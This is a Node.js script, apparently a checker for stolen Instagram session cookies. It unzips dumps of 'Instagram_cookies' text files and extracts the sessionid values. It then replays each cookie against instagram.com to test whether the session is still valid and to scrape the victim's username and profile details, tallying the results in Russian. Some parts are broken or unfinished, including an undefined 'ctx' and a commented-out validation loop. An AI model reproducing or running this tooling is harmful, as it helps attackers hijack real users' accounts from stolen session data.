'use strict';

const fs = require("fs");
let { zip, unzip } = require('cross-unzip')
const fetch = require("node-fetch");
const archiver = require('archiver');

const dirnames = fs.readdirSync('./3')
const filename = './3/download/insta.zip'
const dir = './3/download/insta'
const resultdir = './3/download/insta_result'

const deleteFiles = (dir,filename) =>{
    fs.rmdirSync(dir, { recursive: true });
    fs.rmdirSync(dir+'_result', { recursive: true });
    if(fs.existsSync(filename))fs.unlinkSync(filename)
}


const extractArchieve = (filename) =>{
    const newDir =filename.slice(0,-4);
    if (!fs.existsSync(newDir)){
        fs.mkdirSync(newDir);
    }
    if (!fs.existsSync(newDir+'_result')){
        fs.mkdirSync(newDir+'_result');
    }
    unzip(filename, newDir, err => {

      })
      return newDir;
}

const makeArchieve = (dir) =>{

    let name = dir +'.zip'
    console.log(name)
    let output = fs.createWriteStream(name);
    let archive = archiver('zip');
    
    output.on('close', function () {
        //console.log(archive.pointer() + ' total bytes');
        //console.log('archiver has been finalized and the output file descriptor has closed.');
    });
    
    archive.on('error', function(err){
        throw err;
    });
    
    archive.pipe(output);
    archive.directory(dir, false);
    archive.directory('subdir/', 'new-subdir');
    archive.finalize();
    return name;

}

// *************************


// *************************

const getTxtfiles = (dir) =>{
    let txtFilesArr = [];
    let filesArr = fs.readdirSync(dir);
    for(let el of filesArr){
if(el.slice(-3)== 'txt'){
txtFilesArr.push(dir + '/' + el)
let index = filesArr.indexOf(el)
delete filesArr[index]
}
    }
    filesArr = filesArr.filter(n => n)
    if(filesArr[0]){
        for(let el of filesArr){
            txtFilesArr.push(getTxtfiles(dir+'/'+el))
        }
    }
    return txtFilesArr.flat();
}
//console.log(filename.slice(0,-4))
//extractArchieve(filename)
//console.dir(getTxtfiles(dir));
let txtFiles = [
    './3/download/insta/Instagram_cookies1825729.txt',
    './3/download/insta/Instagram_cookies2036282.txt',
    './3/download/insta/Instagram_cookies305033.txt',
    './3/download/insta/Instagram_cookies414066.txt',
    './3/download/insta/Instagram_cookies475942.txt',
    './3/download/insta/Instagram_cookies578143.txt',
    './3/download/insta/Instagram_cookies721951.txt',
    './3/download/insta/Instagram_cookies746562.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies2304038.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies2591689.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies2594913.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies3349077.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies3565484.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies3597723.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies4005355.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies4027223.txt',
    './3/download/insta/Instagram_cookies/Instagram_cookies4913255.txt'
  ];



const checkForValid = async (sessionIdCookie) => {
    if (typeof sessionIdCookie === "string") {
      let request = await fetch("https://www.instagram.com/", {
        headers: {
          Cookie: `sessionid=${sessionIdCookie}; Domain=.instagram.com; `,
        },
      })
        .then((request) => request.text())
        .then(async (body) => {
          let data = [];
          let arr = body.split("\n");
          for (let el of arr) {
            if (el.includes('viewer":{"biography')) {
              data.push(el);
            }
          }
          if (data[0]) {
            let text = data[0];
            let usernameStart = text.indexOf('username":"') + 11;
            let usernameEnd = text.indexOf('","badge_count"');
            let username = text.slice(usernameStart, usernameEnd);
            let usernameOutput = `https://www.instagram.com/${username}/`;
  
            let secondRequest = await fetch(usernameOutput, {
              headers: {
                Cookie: `sessionid=${sessionIdCookie}; Domain=.instagram.com; `,
              },
            })
              .then((secondRequest) => secondRequest.text())
              .then((body) => {
                let data = [];
                let arr = body.split("\n");
                for (let el of arr) {
                  if (el.includes('<meta content="')) {
                    data.push(el);
                  }
                }
                if (data[0]) {
                  let text = data[0];
                  let startStr = text.indexOf('content="') + 9;
                  let endStr = text.indexOf("- See Instagram photos");
                  let accountInfo = text.slice(startStr, endStr);
                  return `${usernameOutput} - ${accountInfo}\n`;
                }else{
                  return 'Couldn\'t find account data\n';
                }
              });
            return secondRequest;
          } else {
            return "Невалид\n";
          }
        });
      return request;
    } else {
      ctx.reply("wrong format\n");
      ctx.reply(typeof sessionIdCookie);
    }
  };

  const getSessionIds = async (path) => {
    let textArr = fs.readFileSync(path, "utf8").split("\n");
    let sessionIds = [];
     for (let el of textArr) {
      if (el.includes(".instagram.com") && el.includes("sessionid")) {
        
      //  console.dir(el)
        let start = el.lastIndexOf("\t") + 1;
        let end = el.lastIndexOf("\r");
        let sessionId;
        if(end < start){
          sessionId = el.slice(start);
        }else{
          sessionId = el.slice(start, end);
        }
        if(!sessionIds.includes(sessionId)){
            sessionIds.push(sessionId);
        }
      }
    } 

        let res=[];
        for(let el of textArr){
                if(el.includes('.instagram.com')){
                    res.push(el)
                }
            }
            if(res[0]){
              let characterCount = (path.match(new RegExp("/","g")) || []).length;
              let newPath;
              if(characterCount>4){
                let index = path.split("/", characterCount-1).join("/").length
                path =path.slice(0,index) +'_result' + path.slice(index)
                newPath =path.slice(0,path.lastIndexOf('_result')+7)+path.slice(path.lastIndexOf('/'))
                } else{
                let index = path.lastIndexOf('/');
                newPath = path.slice(0,index) +'_result' + path.slice(index);
                }
                 fs.writeFile(newPath,res.join(''),(err) => {
                    if (err) throw err;
                })  
            }
            //console.dir(res.join(''))  
        
    return sessionIds;
  };

  const checkTxtCookies = async(txtNameArr) =>{
    let allCookies = [];
    let txtRes = [];
    let validCounter =0;
    txtRes.push()
    for(let txt of txtNameArr){
     //   console.log(txt)
       let cookie = await getSessionIds(txt)
       if(!allCookies.includes(cookie[0])){
        allCookies.push(cookie[0])
       }

    }
/*     for(let cookie of allCookies){
        let checkRes = await checkForValid(cookie);
        txtRes.push(checkRes)
    } */
    for(let el of txtRes){
        if(el.includes('instagram.com'))validCounter++;
    }
    txtRes.unshift(`Валид: ${validCounter}\n`)
    txtRes.unshift(`Всего найдено куков: ${allCookies.length}\n`)
    txtRes.unshift(`Найдено txt файлов: ${txtNameArr.length}\n`)
    return txtRes.join('');
}

(async() => {
//console.log(await checkTxtCookies(txtFiles))
})()
